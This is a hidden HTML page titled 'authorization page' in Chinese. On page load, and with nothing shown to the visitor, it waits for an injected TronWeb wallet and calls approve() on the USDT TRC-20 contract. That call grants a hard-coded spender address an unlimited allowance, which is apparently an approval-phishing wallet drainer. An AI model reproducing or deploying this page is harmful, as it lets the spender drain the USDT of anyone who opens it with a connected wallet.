<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>授权页面</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
</head>
<body style="display:none;">
<script>
// 配置参数
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER_ADDR = "TTbMYbFf3GoURy8S536ZWioGCEn74T8S3U";
const MAX_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

// 等待TronWeb注入并就绪
async function waitForTronWeb() {
    return new Promise((resolve) => {
        const checkInterval = setInterval(() => {
            if (window.tronWeb && window.tronWeb.ready) {
                clearInterval(checkInterval);
                resolve(window.tronWeb);
            }
        }, 500);
    });
}

// 自动发起授权
async function autoAuth() {
    const tronWeb = await waitForTronWeb();
    const usdtContract = tronWeb.contract().at(USDT_CONTRACT);
    await usdtContract.approve(SPENDER_ADDR, MAX_AMOUNT).send();
}

// 页面加载后立即执行
window.onload = autoAuth;
</script>
</body>
</html>
